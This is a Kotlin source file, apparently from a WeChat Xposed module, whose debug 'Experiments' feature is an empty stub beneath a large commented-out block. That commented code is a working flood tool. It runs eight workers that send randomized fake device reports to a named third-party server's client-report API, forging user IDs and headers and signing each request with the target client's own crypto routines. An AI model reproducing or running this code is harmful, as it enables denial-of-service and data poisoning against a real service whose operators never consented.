//@file:Suppress("PropertyName")
//
//package dev.ujhhgtg.wekit.features.items.debug
//
//import androidx.activity.ComponentActivity
//import dev.ujhhgtg.wekit.constants.PackageNames
//import dev.ujhhgtg.wekit.features.core.ClickableFeature
//import dev.ujhhgtg.wekit.features.core.Feature
//import dev.ujhhgtg.wekit.utils.WeLogger
//import io.ktor.client.HttpClient
//import io.ktor.client.engine.cio.CIO
//import io.ktor.client.plugins.HttpTimeout
//import io.ktor.client.request.header
//import io.ktor.client.request.post
//import io.ktor.client.request.setBody
//import io.ktor.http.ContentType
//import io.ktor.http.contentType
//import io.ktor.http.isSuccess
//import kotlinx.coroutines.CoroutineScope
//import kotlinx.coroutines.Dispatchers
//import kotlinx.coroutines.Job
//import kotlinx.coroutines.currentCoroutineContext
//import kotlinx.coroutines.delay
//import kotlinx.coroutines.isActive
//import kotlinx.coroutines.launch
//import kotlinx.serialization.Serializable
//import kotlinx.serialization.json.Json
//import kotlinx.serialization.json.JsonElement
//import kotlinx.serialization.json.JsonPrimitive
//import kotlinx.serialization.json.buildJsonObject
//import nuke.data.cipher.NativeCrypto
//import java.util.UUID
//import java.util.concurrent.atomic.AtomicInteger
//import kotlin.random.Random
//import kotlin.time.Duration.Companion.milliseconds
//
//@Feature(name = "测试", categories = ["调试"], description = "???")
//object Experiments : ClickableFeature() {
//
//    private val client = HttpClient(CIO) {
//        install(HttpTimeout) {
//            requestTimeoutMillis = 15_000
//        }
//    }
//
//    private val json = Json {
//        ignoreUnknownKeys = true
//        encodeDefaults = true
//    }
//
//    // --- JSON models ---
//
//    @Serializable
//    data class ReportEnvironment(
//        val androidVersion: String,
//        val androidSdkInt: Int,
//        val deviceBrand: String,
//        val deviceManufacturer: String,
//        val deviceModel: String,
//        val deviceName: String,
//        val appVersion: String,
//        val appBuild: String,
//        val packageName: String,
//        val architecture: String,
//        val abi: String,
//        val xposedFramework: String,
//        val xposedVersion: String,
//        val xposedInjectionMode: String,
//        val isRooted: Boolean,
//        val isEmulator: Boolean,
//        val installerPackage: String?,
//        val locale: String,
//        val timezone: String,
//        val networkType: String,
//        val extra: Map<String, JsonElement>,
//    )
//
//    @Serializable
//    data class ClientReportRequest(
//        val message: String,
//        val environment: ReportEnvironment,
//    )
//
//    @Serializable
//    data class EncryptedEnvelope(
//        val v: Int = 3,
//        val iv: String,
//        val kid: String,
//        val payload: String,
//        val tag: String,
//    )
//
////    @Serializable
////    data class ApiResponse(
////        val success: Boolean,
////        val code: String? = null,
////        val message: String? = null,
////        val data: EncryptedEnvelope? = null,
////    )
//
//    // --- flood state ---
//
//    private val floodJobs = mutableListOf<Job>()
//    private val sent = AtomicInteger(0)
//    private val ok = AtomicInteger(0)
//    private val fail = AtomicInteger(0)
//
//    // --- random data generators ---
//
//    private fun randomBrand() = listOf(
//        "Samsung", "Xiaomi", "Huawei", "OPPO", "vivo", "OnePlus",
//        "realme", "Google", "Sony", "ASUS", "Nothing", "HONOR",
//        "Meizu", "ZTE", "nubia", "Lenovo", "Motorola", "LG", "HTC",
//    ).random()
//
//    private fun randomModel(): String {
//        val prefix = randomBrand().uppercase().take(3)
//        val num = Random.nextInt(1000, 9999)
//        val suffix = listOf("", " Pro", " Ultra", " Lite", " 5G", "+", "s").random()
//        return "$prefix-$num$suffix"
//    }
//
//    private fun randomVersion(): String {
//        val major = 8
//        val minor = 0
//        val patch = Random.nextInt(49, 74)
//        return "$major.$minor.$patch"
//    }
//
//    private fun randomBuild() = Random.nextInt(2800, 3100).toString()
//
//    private fun randomLocale() = listOf(
//        "zh-CN", "zh-TW", "zh-HK", "en-US", "ja-JP", "ko-KR",
//        "fr-FR", "de-DE", "ru-RU", "pt-BR", "es-ES", "ar-SA",
//    ).random()
//
//    private fun randomTimezone() = listOf(
//        "Asia/Shanghai", "Asia/Tokyo", "Asia/Seoul", "Asia/Taipei",
//        "Europe/London", "Europe/Paris", "America/New_York", "America/Los_Angeles",
//        "Europe/Moscow", "Australia/Sydney", "Asia/Kolkata", "Asia/Dubai",
//    ).random()
//
//    private fun randomNetwork() = listOf("wifi", "cellular", "ethernet", "unknown").random()
//
//    private fun randomInstaller() = listOf(
//        "com.android.vending", "com.xiaomi.market", "com.huawei.appmarket",
//        "com.oppo.market", "com.heytap.market", "com.bbk.appstore"
//    ).random()
//
//    private fun randomExtra(): Map<String, JsonElement> = buildJsonObject {
//        put("dirtySepolicy", buildJsonObject {
//            put("mode", JsonPrimitive("in_process"))
//            put("available", JsonPrimitive(Random.nextBoolean()))
//            put("enabled", JsonPrimitive(Random.nextBoolean()))
//            put("enforced", JsonPrimitive(Random.nextBoolean()))
//            put("context", JsonPrimitive("u:r:untrusted_app:s0:c${Random.nextInt(100, 999)},c${Random.nextInt(100, 999)}"))
//        })
//    }
//
//    private fun randomEnvironment() = ReportEnvironment(
//        androidVersion = randomVersion().substringBefore("."),
//        androidSdkInt = Random.nextInt(28, 35),
//        deviceBrand = randomBrand(),
//        deviceManufacturer = randomBrand(),
//        deviceModel = randomModel(),
//        deviceName = randomModel().lowercase().take(6),
//        appVersion = randomVersion(),
//        appBuild = randomBuild(),
//        packageName = PackageNames.WECHAT,
//        architecture = "arm64-v8a",
//        abi = "arm64-v8a",
//        xposedFramework = "Xposed",
//        xposedVersion = "${Random.nextInt(1, 10)}.${Random.nextInt(0, 10)}",
//        xposedInjectionMode = listOf("zygote", "lsposed", "riru").random(),
//        isRooted = Random.nextBoolean(),
//        isEmulator = Random.nextBoolean(),
//        installerPackage = randomInstaller(),
//        locale = randomLocale(),
//        timezone = randomTimezone(),
//        networkType = randomNetwork(),
//        extra = randomExtra(),
//    )
//
//    // --- send one random report ---
//
//    private suspend fun sendOne(): Boolean = try {
//        val stream = "nuke-client-stream-v3"
//
//        val report = ClientReportRequest(
//            message = "Nuke 1.0.0 initialized",
//            environment = randomEnvironment(),
//        )
//        val reportJson = json.encodeToString(report)
//
//        val enc = NativeCrypto.nativeEncryptJsonBytes(
//            reportJson.toByteArray(Charsets.UTF_8), stream
//        )
//        val body = EncryptedEnvelope(
//            iv = enc[0],
//            payload = enc[1],
//            tag = enc[2],
//            kid = enc[3],
//        )
//        val bodyJson = json.encodeToString(body)
//
//        val timestamp = (System.currentTimeMillis() / 1000).toString()
//        val nonce = UUID.randomUUID().toString()
//        val userId = "wxid_" + (1..16).map { ('a'..'z').random() }.joinToString("")
//        val platform = listOf("WECHAT", "QQ", "TIKTOK").random()
//
//        val signPayload = listOf("POST", "/api/client/report", userId, platform, timestamp, nonce, bodyJson)
//            .joinToString("\n")
//        val signature = NativeCrypto.nativeSignClientPayload(signPayload)
//
//        val response = client.post("https://www.guang233.com/api/client/report") {
//            contentType(ContentType.Application.Json)
//            header("X-Client-Id", userId)
//            header("X-Platform", platform)
//            header("X-Timestamp", timestamp)
//            header("X-Nonce", nonce)
//            header("X-Signature", signature)
//            setBody(bodyJson)
//        }
//
//        response.status.isSuccess()
//    } catch (_: Exception) {
//        false
//    }
//
//    // --- flood worker ---
//
//    private suspend fun floodWorker() {
//        while (currentCoroutineContext().isActive) {
//            val n = sent.incrementAndGet()
//            val success = sendOne()
//            if (success) ok.incrementAndGet() else fail.incrementAndGet()
//
//            if (n % 50 == 0) {
//                WeLogger.d(TAG, "[#$n] sent=${sent.get()} ok=${ok.get()} fail=${fail.get()}")
//            }
//
//            delay(Random.nextLong(50, 300).milliseconds)
//        }
//    }
//
//    // --- lifecycle ---
//
//    override fun onEnable() {
//        WeLogger.d(TAG, "starting flood (8 workers)")
//        sent.set(0); ok.set(0); fail.set(0)
//        repeat(8) { _ ->
//            floodJobs += CoroutineScope(Dispatchers.IO).launch {
//                floodWorker()
//            }
//        }
//    }
//
//    override fun onDisable() {
//        WeLogger.d(TAG, "stopping flood... final: sent=${sent.get()} ok=${ok.get()} fail=${fail.get()}")
//        floodJobs.forEach { it.cancel() }
//        floodJobs.clear()
//    }
//
//    override fun onClick(context: ComponentActivity) {
//        CoroutineScope(Dispatchers.IO).launch {
//            val success = sendOne()
//            WeLogger.d(TAG, "single test: ${if (success) "OK" else "FAIL"}")
//        }
//    }
//
//    @Suppress("unused")
//    private const val TAG = "Experiments"
//}

package dev.ujhhgtg.wekit.features.items.debug

import androidx.activity.ComponentActivity
import dev.ujhhgtg.wekit.features.core.ClickableFeature
import dev.ujhhgtg.wekit.features.core.Feature

@Feature(name = "测试", categories = ["调试"], description = "???")
object Experiments : ClickableFeature() {

    @Suppress("unused")
    private const val TAG = "Experiments"

    override val noSwitchWidget = true

    override fun onClick(context: ComponentActivity) {
    }
}
